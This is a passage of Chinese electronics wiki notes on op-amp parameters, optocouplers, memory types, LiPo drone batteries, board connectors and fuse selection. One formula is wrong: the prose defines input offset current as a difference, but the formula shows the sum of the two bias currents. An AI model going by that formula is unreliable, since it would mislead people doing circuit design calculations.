id="差分放大器"><a href="#差分放大器" class="headerlink" title="差分放大器"></a>差分放大器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606222820.png"></p><p>差分放大器用于从差分或单端信号源驱动差分输入 ADC。</p><h3 id="仪表放大器"><a href="#仪表放大器" class="headerlink" title="仪表放大器"></a>仪表放大器</h3><p><img src="https://img.wiki-power.com/d/wiki-media/img/20220606223014.png"></p><p>仪表放大器用于放大低电平差分信号，抑制共模信号。其中，$V_{IN}$ 为两个输入端之间的电压差值</p><h2 id="运放的参数"><a href="#运放的参数" class="headerlink" title="运放的参数"></a>运放的参数</h2><h3 id="开环电压增益"><a href="#开环电压增益" class="headerlink" title="开环电压增益"></a>开环电压增益</h3><p>开环电压增益 $A_{uo}$ 表示运放工作在线性放大区下的放大倍数，用 dB 表示。</p><h3 id="失调-偏移电压"><a href="#失调-偏移电压" class="headerlink" title="失调 &#x2F; 偏移电压"></a>失调 &#x2F; 偏移电压</h3><p>失调电压 $V_{OS}$（Input Offset Voltage）有时候也称输入偏置电压。指的是运放输入端为 0V 的条件下，理想运放输出应为零，但实际运放输出不为零，则实际输出电压除以增益得到的等效输入电压称为失调电压。失调电压实际上反映了运放内部的对称性。</p><p>失调电压的影响因素有温度（对应失调电压的温漂）、电源波动（对应电源抑制比）。失调电压是直流偏置，会叠加在输出上，如果输出为交流信号，只需考虑叠加后是否会超过供电电压导致信号失真。</p><p>我们知道，同相放大器的放大公式是 $V_{OUT}&#x3D;V_{IN}(\frac{R_F}{R_G}+1)$，如果考虑失调电压的影响，那么输出为 $V_{OUT}&#x3D;(V_{IN}+V_{OS})(\frac{R_F}{R_G}+1)$。</p><h3 id="失调电压温漂"><a href="#失调电压温漂" class="headerlink" title="失调电压温漂"></a>失调电压温漂</h3><p>失调电压温漂 $T_C V_{OS}$ 表示输入失调电压变化量与温度变化量的比值（芯片工作温度范围内）。</p><p>失调电压温漂会导致失调电压发生变化，影响运放输出。</p><h3 id="输入失调电流"><a href="#输入失调电流" class="headerlink" title="输入失调电流"></a>输入失调电流</h3><p>失调电流 $I_{OS}$ 指当运放输出为零时，两个输入端流入 &#x2F; 流出直流电流的差值。失调电流受制造工艺的影响。</p><p>$$<br>I_{OS}&#x3D;I_{B+}+I_{B-}<br>$$</p><h3 id="输入偏置电流"><a href="#输入偏置电流" class="headerlink" title="输入偏置电流"></a>输入偏置电流</h3><p>偏置电流 $I_B$ 指当运放输出为零时，两个输入端流入 &#x2F; 流出直流电流的均值。</p><p>$$<br>I_B&#x3D;\frac{I_{B+}+I_{B-}}{2}<br>$$</p><p>偏置电流受制造工艺的影响，双极型工艺输入偏置电流在 10nA~1μA 之间；场效应管工艺输入偏置电流一般低于 1nA。</p><p>可通过在同相端增加匹配电阻，消除误差。</p><h3 id="增益带宽积"><a href="#增益带宽积" class="headerlink" title="增益带宽积"></a>增益带宽积</h3><p>增益带宽积 $GBW$（Gain–bandwidth product，GBWP&#x2F;GBW&#x2F;GBP&#x2F;GB）指在某频率（一般为运放增益衰减 -3dB）下开环电压增益与测量频率（带宽）的乘积。</p><p>$$<br>GBW&#x3D;A_{uo}*BW<br>$$</p><p>增益带宽积受运放内结电容的频率响应特性影响。在设计中如果发现高频信号增益大小受限，则必须选用 $GBP$ 参数较大的运放。</p><h3 id="共模抑制比"><a href="#共模抑制比" class="headerlink" title="共模抑制比"></a>共模抑制比</h3><p>共模抑制比 $CMRR$（Common Mode Rejection Ratio，CMRR）指的是共模电压范围（$CMVR$）与此范围内的输入失调电压（$\Delta V_{O_{OS}}$）变化的比值，结果用 dB 表示。</p><p>$$<br>CMRR&#x3D;20log(\frac{CMVR}{V_{O_{OS}}})<br>$$</p><p>共模抑制比受电路对称性（失调电流等参数）、线性工作范围的影响。此参数是为了表示差分放大电路抑制共模信号、放大差模信号的能力。共模抑制比高，意味着可以更加抑制共模输入的干扰信号，提高信噪比。</p><h3 id="转换速度"><a href="#转换速度" class="headerlink" title="转换速度"></a>转换速度</h3><p>转换速度 $SR$（Slew Rate，SR）也称压摆率。表示在大信号条件下，输出电压变化的最大速率。</p><p>$$<br>SR&#x3D;2 \pi f V_{pk}<br>$$</p><p>其中，$f$ 为最大频率（一般为带宽），$V_{pk}$ 是放大输出信号的最大峰峰值。</p><p>转换速度用于评价运放对信号变化速度的适应能力，是衡量运放在大幅度信号作用时工作速度的参数。当输入信号变化斜率的绝对值小于 SR 时，输出电压才按线性规律变化。</p><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><ul><li>共模电压范围 $CMVR$：也称为输入电压范围，如果两个输入端输入电压超出此范围，输出将发生削波或过大非线性现象。</li><li>全功率带宽：指在单位增益下测得的最大频率，在此频率下可以得到一个正弦信号的额定输出电压，且压摆率不会导致信号失真。</li><li>工作电源电压范围：运放正常工作时，能施加的电源电压范围。</li><li>电源抑制比 $PSRR$：电源电压的变化与输入失调电压的变化之比，结果用 dB 表示。</li><li>建立时间：施加一个阶跃输入后，放大器建立至某一预定的精度水平或输出电压百分比所需的时间。</li><li>电源电流：放大器空载工作时电源电压需提供的电流。</li></ul><h2 id="根据参数选型"><a href="#根据参数选型" class="headerlink" title="根据参数选型"></a>根据参数选型</h2><p>根据参数挑选运放，大致有以下步骤：</p><ol><li>判断输入信号类型：直流需注意失调电流、失调电压；差分输入需判断是否选择仪表放大器；高频交流信号需注意增益带宽积 $GBW$ 和转换速度 $SR$。</li><li>判断精度要求：需要考虑失调电压、偏置电流、失调电流、共模抑制比对精度影响，判断是否选用高阻运放或精密运放。</li><li>判断环境条件：需要注意运放的温度量程，注意温漂，注意电源纹波抑制比 $PSRR$ 的影响。</li><li>判断其他要求：通道数、单 &#x2F; 双电源供电（轨对轨信号失真小，可满幅值输出）、功率大小（高压 &#x2F; 大电流情况下）。</li></ol><h3 id="根据用途选型"><a href="#根据用途选型" class="headerlink" title="根据用途选型"></a>根据用途选型</h3><p>按照用途，运放大致分为：</p><ul><li>通用运放：对各类要求均不高的器件，注重通用与性价比。</li><li>音频运放：超低噪声（高保真）、低功耗（高续航）。</li><li>高速运放（$GBW ≥ 50 MHz$）：低功耗、低噪声 SNR。</li><li>功率运放：高电压、大电流。</li><li>精密运放（$V_{os} &lt; 1mV$）：低失调电压，或低温漂、低噪声、低功耗、宽带宽。</li></ul><h2 id="参考与致谢-5"><a href="#参考与致谢-5" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://mp.weixin.qq.com/s/Zc9J0nQhVcpZTCbujJf5SQ">我懂了！运算放大器的工作原理讲得好！</a></li><li><a href="https://mp.weixin.qq.com/s/kGG7MhBRJPRi3rt50yMWwQ">三个经典的运放电路</a></li><li><a href="https://ez.analog.com/cfs-file/__key/telligent-evolution-components-attachments/00-595-00-00-00-09-21-14/attachment.pdf">运算放大器选型指南</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAwNTA3MTE0OQ==&mid=100000105&idx=1&sn=cf052524b2e808967cb1aa5583410b08&scene=19#wechat_redirect">运放选型速记指南</a></li><li><a href="https://www.nuedc-training.com.cn/index/live/playback/live_id/14.html">TI 运算放大器选型指南</a></li><li><a href="http://mouser.eetrend.com/files/2017-07/%E8%AE%A8%E8%AE%BA%E7%89%88%E4%B8%BB%E9%A2%98/100007054-22676-dian_ya_.pdf">运算参数的详细解释和分析【TI FAE 分享】</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="基本元器件-光电耦合器"><a href="#基本元器件-光电耦合器" class="headerlink" title="基本元器件 - 光电耦合器"></a>基本元器件 - 光电耦合器</h1><p>光耦是将发光二极管（LED）和光电探测器集成于一个封装中的器件。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20210725130317.png"></p><h2 id="光耦的作用"><a href="#光耦的作用" class="headerlink" title="光耦的作用"></a>光耦的作用</h2><p>在光耦中，一次侧（LED 侧）和二次侧（受光器件侧）是电绝缘的。因此，即使一次侧和二次侧的电位（甚至 GND 电位）不同，也可以将一次侧电信号传输到次级侧。光耦将两端电路隔离开来。</p><h2 id="光耦的参数"><a href="#光耦的参数" class="headerlink" title="光耦的参数"></a>光耦的参数</h2><p>LED 侧：</p><ul><li>正向工作电压 Vf（Forward Voltage）：Vf 是指在给定的工作电流下，LED 本身的压降。常见的小功率 LED 通常以 If&#x3D;20mA 来测试正向工作电压，当然不同的 LED，测试条件和测试结果也会不一样。</li><li>反向电压 Vr（Reverse Voltage）：指 LED 所能承受的最大反向电压，超过此反向电压，可能会损坏 LED。在使用交流脉冲驱动 LED 时，要特别注意不要超过反向电压。</li><li>反向电流 Ir（Reverse Current）：通常指在最大反向电压情况下，流过 LED 的反向电流。</li><li>允许功耗 Pd（Maximum Power Dissipation）：LED 所能承受的最大功耗值。超过此功耗，可能会损坏 LED。</li><li>中心波长 λp（Peak Wave Length）：是指 LED 所发出光的中心波长值。波长直接决定光的颜色，对于双色或多色 LED，会有几个不同的中心波长值。</li><li>正向工作电流 If（Forward Current）：If 是指 LED 正常发光时所流过的正向电流值。不同的 LED，其允许流过的最大电流也会不一样。</li><li>正向脉冲工作电流 Ifp（Peak Forward Current）：Ifp 是指流过 LED 的正向脉冲电流值。为保证寿命，通常会采用脉冲形式来驱动 LED，通常 LED 规格书中给中的 Ifp 是以 0.1ms 脉冲宽度，占空比为 1&#x2F;10 的脉冲电流来计算的。</li></ul><p>光敏三极管侧：</p><ul><li>集电极电流 Ic（Collector Current），光敏三极管集电极所流过的电流，通常表示其最大值。</li><li>集电极-发射极电压 Vceo（C-E Voltage），集电极-发射极所能承受的电压。</li><li>发射极-集电极电压 Veco（E-C Voltage），发射极-集电极所能承受的电压。</li><li>反向截止电流 Iceo</li><li>C-E 饱和电压 Vce(sat)（C-E Saturation Voltage）</li></ul><p>传输特性：</p><ul><li>电流传输比 CTR（Current Transfer Radio）：通常用直流电流传输比来表示。当输出电压保持恒定时，它等于直流输出电流 IC 与直流输入电流 IF 的百分比。</li><li>上升时间 Tr （Rise Time）&amp; 下降时间 Tf（Fall Time）</li></ul><p>隔离特性：</p><ul><li>入出间隔离电压 Vio（Isolation Voltage），光耦合器输入端和输出端之间绝缘耐压值。</li><li>入出间隔离电容 Cio（Isolation Capacitance），光耦合器件输入端和输出端之间的电容值</li><li>入出间隔离电阻 Rio：（Isolation Resistance），半导体光耦合器输入端和输出端之间的绝缘电阻值。</li></ul><h2 id="参考与致谢-6"><a href="#参考与致谢-6" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://toshiba-semicon-storage.com/cn/semiconductor/knowledge/e-learning/discrete.html#Chapter5">分立半导体器件 - 第 Ⅴ 章：光半导体</a></li><li><a href="https://www.eefocus.com/e/483370">光耦的参数有哪些 光耦参数如何理解</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="存储器的分类"><a href="#存储器的分类" class="headerlink" title="存储器的分类"></a>存储器的分类</h1><p>储器一般可以分为内部存储器（内存，RAM）、外部存储器（外存，ROM）、缓冲存储器（缓存，Cache）及闪存（Flash）极大类别。</p><h2 id="内存-RAM"><a href="#内存-RAM" class="headerlink" title="内存 RAM"></a>内存 RAM</h2><p>内存 RAM（random access memory）是随机存取存储器，存储单元的内容可以按照需要随机取出或者存入（不需要线性依次存储），存取数据比较快，掉电会丢失数据，容量相对小。一般 CPU（MCU）运行时会把程序从 ROM 拷贝到 RAM 里面执行，所以一般 RAM 是作为和 CPU（MCU） 直接交换数据的内部存储器，也叫主存或者内存。</p><p>内存有以下的类别：</p><ul><li>SRAM：静态随机存取存储器（Static RAM），具有静态存取功能。不需要刷新电路就能保存它内部存储的数据，特点是高性能、低集成度（占地面积大）、功耗大、速度可以非常快，但价格高、容量小。一般在 MCU 或者 SOC 会内置一小块 SRAM，用于高速缓存（Cache）。缓存是数据交换的缓冲区。当某一设备需要读取数据时，会首先从缓存中查找，如果找到了则直接运行，找不到才去内存中找。因为缓存的读写速度比内存快得多，故缓存的意义就是帮助系统更快地运行。<ul><li>PSRAM：伪静态存储器，内部自带刷新机制。</li><li>SSRAM：同步静态随机存取存储器（Synchronous SRAM），有时钟线，读写以时钟信号为基准。</li></ul></li><li>DRAM：动态随机存取存储器（Dynamic RAM），每隔一段时间固定对 DRAM 刷新充电一次，否则内部数据会消失。现在电脑用的 DDR 内存条都属于 DRAM。<ul><li>DARAM：双口 RAM，一个时钟周期可访问两次。</li><li>SDRAM：同步动态随机存取存储器（Synchronous DRAM），数据的收发以时钟信号为基准。<ul><li>SDR SDRAM：单倍速率（Single-Data-Rate）SDRAM，采用单端（Single-Ended）时钟信号，在时钟上升沿采样。</li><li>DDR SDRAM：双倍速率（Double-Data-Rate）SDRAM，在时钟上升下降沿采样，工作频率比 SDR 翻倍，采用差分的时钟信号以加强抗干扰。工作电压 2.5V&#x2F;2.6V。</li><li>DDR2 SDRAM：内存时钟 200~533MHz，工作电压 1.8V。</li><li>DDR3 SDRAM：8bit 预取机制，内存时钟 400~1066MHz，工作电压 1.5V&#x2F;1.35。</li><li>DDR4 SDRAM：16bit 预取机制，工作电压 1.2V。</li><li>DDR5 SDRAM：工作电压 1.1V。</li><li>GDDR SDRAM：图形 DDR，目前有 GDDR2~6。</li><li>LPDDR SDRAM：低功率 DDR，时钟 166MHz，LPDDR2 其工作电压 1.2V，时钟 100~533MHz。</li></ul></li></ul></li></ul><p>DDR 三个版本的参数比较：</p><table><thead><tr><th>条目</th><th>DDR3</th><th>DDR2</th><th>DDR</th></tr></thead><tbody><tr><td>工作频率</td><td>400&#x2F;533&#x2F;667&#x2F;800 MHz</td><td>200&#x2F;266&#x2F;333&#x2F;400 MHz</td><td>100&#x2F;133&#x2F;166&#x2F;200 MHz</td></tr><tr><td>数据传输速率</td><td>800&#x2F;1066&#x2F;1333&#x2F;1600 MT&#x2F;s</td><td>400&#x2F;533&#x2F;667&#x2F;800 MT&#x2F;s</td><td>200&#x2F;266&#x2F;333&#x2F;400 MT&#x2F;s</td></tr><tr><td>预取位宽</td><td>8-bit</td><td>4-bit</td><td>2-bit</td></tr><tr><td>输入时钟类型</td><td>差分时钟</td><td>差分时钟</td><td>差分时钟</td></tr><tr><td>突发长度</td><td>8，4</td><td>4，8</td><td>2，4，8</td></tr><tr><td>DQS</td><td>差分数据选通</td><td>差分数据选通</td><td>单端数据选通</td></tr><tr><td>电源电压</td><td>1.5V</td><td>1.8V</td><td>2.5V</td></tr><tr><td>数据电平标准</td><td>SSTL_15</td><td>SSTL_18</td><td>SSTL_2</td></tr><tr><td>CL</td><td>5，6，7，8，9 时钟</td><td>3，4，5 时钟</td><td>2，2.5，3 时钟</td></tr><tr><td>ODT</td><td>支持</td><td>支持</td><td>不支持</td></tr></tbody></table><h2 id="外存-ROM"><a href="#外存-ROM" class="headerlink" title="外存 ROM"></a>外存 ROM</h2><p>外存 ROM（Read Only Memory）也称为辅助存储器，不能与 CPU 之间直接进行信息交换。它的储存速度相对慢得多、但容量相对大，在简单的系统上常与内存配合使用，作为储存程序与其他文件的空间。</p><p>ROM 最开始是一次性的，只能写入一次，后续只能读取操作，数据掉电不会消失，如 CD-ROM、DVD-ROM，后面出现的 PROM、EPROM、EEPROM 可有条件地写入。</p><p>外存有以下的类别（按时间推进）：</p><ul><li>PROM：可编程 ROM，内部是行列式熔断丝，可以自己写入一次，写错了，只能再换一片。</li><li>EPROM：紫外线可擦除，写入时需要用编程器产生高压脉冲信号。</li><li>OTP-ROM：一次可编程 ROM，写入原理与 EPROM 相同。</li><li>EEPROM：电可擦除可编程只读存储器（Electrically Erasable Programmable），在 EPROM 的基础上进一步发展形成，可电擦除，可以按照字节操作，但是集成度不高、价格比较贵。</li></ul><h2 id="闪存-Flash"><a href="#闪存-Flash" class="headerlink" title="闪存 Flash"></a>闪存 Flash</h2><p>闪存 Flash 是一种长寿命的非易失性（掉电保存）的存储器，算是广义的 EEPROM，因为它也是可电擦除的 ROM，它与 EEPROM 最大的区别就是，只能按照扇区（block）操作读写，但其成本比 EEPROM 低。FALSH 分为 NOR FLASH 和 NAND FLASH。</p><p>闪存有以下的类别（按时间推进）：</p><ul><li>NOR Flash：数据线和地址线分开，可以实现像 RAM 的随机寻址 &#x2F; 读取功能，也就是说程序可以在 NOR Flash 上直接运行，不需要拷贝到 RAM 中。但容量小，分为 Parallel&#x2F;Serial NOR Flash。</li><li>Nand Flash：数据线和地址线复用，不能利用地址线随机寻址，不能直接运行程序，容量大，有 SLC、MLC、TLC、QLC</li><li>MMC：MMC 接口、NAND Flash、主控制器</li><li>eMMC Flash：嵌入式存储解决方案，带有 MMC 接口（并行数据总线）、NAND Flash、主控制器</li><li>UFS：串行数据总线、Nand Flash、主控制器</li></ul><h2 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h2><ul><li>eMMC 的最新 5.1 标准理论最高值最高可以达到 400MB&#x2F;s，UFS 的最大优势就是双通道双向读写，UFS3.0 接口带宽最高 23.2Gbps，也就是 2.9GB&#x2F;s。</li><li>eMMC 的电路接口与 SD 卡是一样的，SD 卡只是焊接在 PCB 上，然后做上金手指和外壳。eMMC 支持 8 位和 4 位数据总线，SD 卡标准是 4 位数据总线。</li><li>eMMC 有两条总线，分别传输指令数据输入和输出，而且因为是并行总线还要有额外的 data strobe。而 UFS 则是有两条差分的数据 lane，指令和数据都是以 packet 的形式发送的。</li><li>SSD &#x3D; 主控 + DRAM 缓存 + Nand Flash</li><li>eMMC &#x3D; 主控 + Nand Flash + 标准封装接口</li></ul><h2 id="参考与致谢-7"><a href="#参考与致谢-7" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://blog.infonet.io/2021/04/04/RAM-ROM-Flash-%E5%8C%BA%E5%88%AB/">RAM ROM Flash UFS 区别</a></li><li><a href="https://mp.weixin.qq.com/s/hOew2ym8SSbse5RrZ5ehcw">存储知识和 AUTOSAR NVM 存储服务</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDYyMzg3NQ==&mid=2247484794&idx=1&sn=b9f8acc771de990dcd941795330894d8&chksm=c01d8c96f76a0580216939860c46bf5edd289f14a306a92b60888f785e7146b7f71846eb9f46&token=203917856&lang=zh_CN#rd">DDR3 总结笔记</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote><h1 id="其他器件-电源"><a href="#其他器件-电源" class="headerlink" title="其他器件-电源"></a>其他器件-电源</h1><h2 id="航模电池"><a href="#航模电池" class="headerlink" title="航模电池"></a>航模电池</h2><h3 id="插头"><a href="#插头" class="headerlink" title="插头"></a><strong>插头</strong></h3><p>无人机电池通用的插头是T型，也就是我们俗称的T插。随着电池放电性能越来越好，电子调速器的承受电流能力也越来越高，普通T型插头已经不能完全满足模友们的需求，于是有了XT60插头，它可以很好的承受巨大的电流输出，根据插头使用的金属成分不同，其电流耐受能力可从50A－120A之间变化，可以满足大多数无人机的需求。</p><h3 id="参数S"><a href="#参数S" class="headerlink" title="参数S"></a><strong>参数S</strong></h3><p>在说到航模电池时，我们一般会说多少S电池。其中的S即为几片串联的意思。例如3S／2200mAh电池就是3片2200mAh的电池串联。</p><p>由于单片电池的电压为3.7V，所以通过电池的参数S，我们也可以得知电池的电压。例如，3S电池的电压为3*3.7V，即11.1V。</p><h3 id="参数mAh"><a href="#参数mAh" class="headerlink" title="参数mAh"></a><strong>参数mAh</strong></h3><p>电池的容量是用毫安时mAh来表示，它指电池以某个电流来放电能维持一小时，例如1000mAh的电池理论上能保持1A的电流放电一小时。电池的mah值越大，电池的容量就越多。</p><p>电池的放电并非是线性的，但电池在小电流时的放电时间总是大于大电流时的放电时间，我们可以近似大致估算出电池在其它电流情况下的放电时间。</p><h3 id="参数C"><a href="#参数C" class="headerlink" title="参数C"></a><strong>参数C</strong></h3><p>C指电池的放电倍率，指电池在规定的时间内放出其额定容量时所需要的电流值。C数越大，电池就越暴力。1C针对不同容量电池是不一样的。1C是指电池用1C的放电率放电可以持续工作1小时。</p><p>电池的放电能力，即最大持续电流＝额定容量*放电倍率C。例如3S／2200mAh／20C电池的最大持续电流就是2.2*20&#x3D;44A。如果该电池长时间超过44A或以上电流工作，那么电池寿命会变短。</p><p><strong>这个参数实际上就是体现的电池的放电能力</strong></p><h3 id="充电注意事项"><a href="#充电注意事项" class="headerlink" title="充电注意事项"></a><strong>充电注意事项</strong></h3><p>充电电流：充电电流不得超过规格书中规定的最大充电电流（一般情况下为0.5~1.0C或以下），一般设1-2A的电流。使用高于推荐电流充电将可能引起电池的充放电性能、机械性能和安全性能的问题，并可能导致发热或泄漏。目前市场销售的5C电流充电的航模电池，建议也不要经常使用5C充电，以免影响电池寿命。</p><p>充电电压：充电电压不得超过规定的限制电压（4.20V&#x2F;单体电池），4.25V为每只节充电电压的最高极限。</p><p>充电温度：电池必须在产品规格书规定的环境温度范围内进行充电，否则电池易受损坏。当发现电池表面温度异常时（指电池表面温度超过50℃），应立即停止充电。</p><p><strong>电池维护</strong></p><p>电池使用后如在3天内没有飞行任务，请将单片电压充至3.80<del>3.90V保存。再有充好电后因各种原因没有飞，也要在充满后3天内把电池放电到3.80</del>3.90V保存。</p><p>电池应放置在阴凉的环境下贮存，长期存放电池时（超过3个月）最好能放在密封袋中或密封的放爆箱内，建议环境温度为10~25°C，且干燥、无腐蚀性气体。</p><p>电池的外皮对于电芯是起保护作用。是防止电池爆炸和漏夜起火的重要结构。所以尽量避免把电池外皮刮破。电池要轻拿轻放，在飞机上固定电池时，扎带要束紧。因为会有可能在做大动态飞行或摔机时，电池会因为扎带不紧而甩出，这样也很容易造成电池外皮破损。</p><p>保护外皮的同时也要防止电池的短路。电池短路往往发生在焊线维护以及运输过程中。所以当发现使用过一段时间后电池出现断线的情况需要重新焊线时，特别要注意电烙铁不要同时接触电池的正极和负极。另外运输电池的过程中，最好的办法是，把电池都单独套上自封袋并置于防爆箱内，防止因运输过程中，因颠簸和碰撞导致某片电池的正极和负极同时碰到其他导电物质而短路或破皮而短路</p><h1 id="其他器件-连接器"><a href="#其他器件-连接器" class="headerlink" title="其他器件-连接器"></a>其他器件-连接器</h1><p>连接器根据所连接的对象的不同，其种类分为多种：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141127396.png"></p><p>其中我们这里主要了解板对板连接器、板到线连接器。</p><p>引脚间距是指两个相邻引脚中心之间的距离。下图中显示的是同一排相邻引脚间距的测量和两排之间引脚间距的测量。请注意，在这个例子中，同一排相邻引脚间距的测量和两排之间引脚间距是不一样的。同一排相邻引脚间距的测量和两排之间引脚间距可以相同，所以连接器一定要仔细检查这两个参数。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141130743.png"></p><h2 id="公插针和母插口-排针和排母"><a href="#公插针和母插口-排针和排母" class="headerlink" title="公插针和母插口(排针和排母)"></a>公插针和母插口(排针和排母)</h2><p>排针连接器是一个可以固定在 PCB 上并带有公插针的连接器。这些连接器也称为 Berg、Bergstides 或Bergstik 连接器。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141137321.png"></p><p>接头与“针座，公插针”一样，是一个固定在 PCB 上的连接器，但这些接头具有母插口，而不是公插针。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141138237.png"></p><h2 id="主要的参数"><a href="#主要的参数" class="headerlink" title="主要的参数"></a>主要的参数</h2><ol><li>间距<br>  这是从一个端子的中心到其旁边端子的中心的测量值。常见的节距测量值为2.54mm（0.1英寸）、2.0mm（0.079英寸）和1.27mm（0.05英寸），但有许多其他选项可用。</li></ol><p>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141145614.png"></p><ol start="2"><li><p>排距<br>与间距类似，排距是从一行中心到下一行中心的测量值。通常情况下，该测量值与间距匹配，但由于情况并非总是如此，因此应进行测量来验证。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141147778.png"></p></li><li><p>针位数<br>这通常基于一个连接器中的总针数，而不是每行的针数，并以相同的方式进行测量。在前一张照片中，所示的连接器被认为是16针，尽管它每行有8针。在商城之中，可能会看到以网格格式描述或指定的连接器，例如上图中的“2x8”。“2x8”“1x16”和“16位针座”都具有相同的位置数。</p></li><li><p>方向<br>这里的方向指的是排针的方向。</p><p>针座最常见的方向是垂直方向，其中端子与PCB垂直，但许多应用要求连接器为直角，其中端子平行于PCB表面。了解你的项目所需有助于大大缩小搜索选项。示例如下。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141150493.png"></p><p> 这里主要的区别在于连接线与 PCB 之间的方向。对于卧式连接器来说线是平行于 PCB 表明的；对于立式连接器来说，线是垂直于 PCB 表面的。</p></li><li><p>安装类型</p><p>连接器如何固定到PCB上称为安装。最常见的安装方法是表面安装（在 PCB 表面上，安装端子到焊盘）和通孔（端子穿过PCB中的孔并从后部焊接到位）。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141151438.png"></p></li><li><p>表面处理</p><p> 在大多数情况下，对针座中的端子进行电镀，以减少端子随时间腐蚀或氧化的机会，从而抑制其导电性。最常见的电镀选择是纯锡或金。金具有最好的耐腐蚀性或抗氧化性，以及更好的导电性，但它会增加产品的成本，并且不像锡那样适合重复的配合周期，因为有些配合周期会磨损。镀金层越厚，它能够承受的交配周期就越多，但成本也会相应增加。</p></li><li><p>护罩</p><p> 针座可以有塑料壁。护罩可以保护端子，当不连接时、可以用于匹配或用于机械闭锁目的。护罩可以位于连接器的一侧、两侧（通常相对）、三侧或全部四侧。</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141156431.png"></p></li><li><p>夹具</p><p> 有一些连接器是具有夹具的。这些带有夹具的一般都是为了方便接线使用的。</p></li></ol><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>由于连接器的种类实在繁多，所以在很多时候我们可以通过不同的连接器的组合使用来达到我们想要的目的。</p><p><strong>特别是杜邦线的使用</strong>，杜邦线的两边都可以使用不同的连接器进行连接，这样可以达到更高、更好的连接性。例如：</p><ul><li>一边针座连接器，一边是引出的引脚</li><li>两边都是针座连接器</li><li>两边都是引出的引脚</li><li></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.digikey.cn/zh/forum/t/topic/2394">https://www.digikey.cn/zh/forum/t/topic/2394</a></p><h1 id="其他器件-保险丝的选型"><a href="#其他器件-保险丝的选型" class="headerlink" title="其他器件-保险丝的选型"></a>其他器件-保险丝的选型</h1><h2 id="通用选型"><a href="#通用选型" class="headerlink" title="通用选型"></a>通用选型</h2><ul><li>耐压值（最大电压）：需大于电源的电压，并留合适的余量。</li><li>额定电流：需大于正常使用时的工作电流（额定电流非熔断电流）。</li><li>工作温度：留余量 25% 以上。</li><li>电压降&#x2F;冷电阻：一般越小越好（功率损耗小）</li><li>熔断特性：保险丝最主要的电性能指标。表示当电流超额时，熔体温度逐渐上升，直至最后保险丝被烧断。根据熔断特性不同，可以把保险丝分为快速型和延时型。延时型常用在电路状态变化时有较大浪涌电流的感性或容性电路中，能承受开关机时浪涌脉冲的冲击；快速型常用在阻性电路中，保护一些对电流变动特别敏感的元器件。</li><li>分断能力：表示在规定的电压下，保险丝能安全地切断的最大电流。</li></ul><h2 id="PPTC-选型"><a href="#PPTC-选型" class="headerlink" title="PPTC 选型"></a>PPTC 选型</h2><p>自恢复保险丝（PPTC，Polymeric Positive Temperature Coefficient）正常工作时电阻很小（压降很小），当电路出现过流使其温度升高时，电阻急剧增大几个数量级，使电路中的电流减小到安全值以下，从而使后面的电路得到保护，过流消失后自动恢复为低阻，免除电流保险丝经常更换的麻烦。</p><p>参数：</p><ul><li>最大电压 $V_{max}$（Rated Voltage）：额定电流下可承受的最大电压。</li><li>最大电流 $I_{max}$（Maximum Current）：额定电压下可承受的最大电流。</li><li>保持电流 $I_{hold}$（Hold Current）：不动作（不会使电阻值突变）的最大电流。</li><li>触发电流 $I_{trip}$（Trip Current）：发生动作（使电阻值突然变大）的最小电流，一般为保持电流的两倍。</li><li>动作功率 $P_d$（Typical power）：动作状态下的消耗功率。</li><li>最大动作时间 $T_{trip}$（Max Time to Trip）：规定电流下的最大的动作时间。</li><li>静态电阻 $R_{i_{min&#x2F;max}}$（Resistance Tolerance）：焊接前初始阻值。</li><li>焊接一小时后电阻 $R_{1_{max}}$：焊接 &#x2F; 跳闸一小时后的最大阻值。</li></ul><h2 id="参考与致谢-8"><a href="#参考与致谢-8" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="http://www.tergy.com/297/933.html">贴片自恢复保险丝的额定电压参数值所代表什么意思？</a></li><li><a href="https://mp.weixin.qq.com/s/uJp8fnafHpVfJFnVWkfAWg">什么？！选保险丝还有技巧？</a></li><li><a href="https://semiware.com/pptc/pptc03.html">自恢复保险丝 PPTC 的参数</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 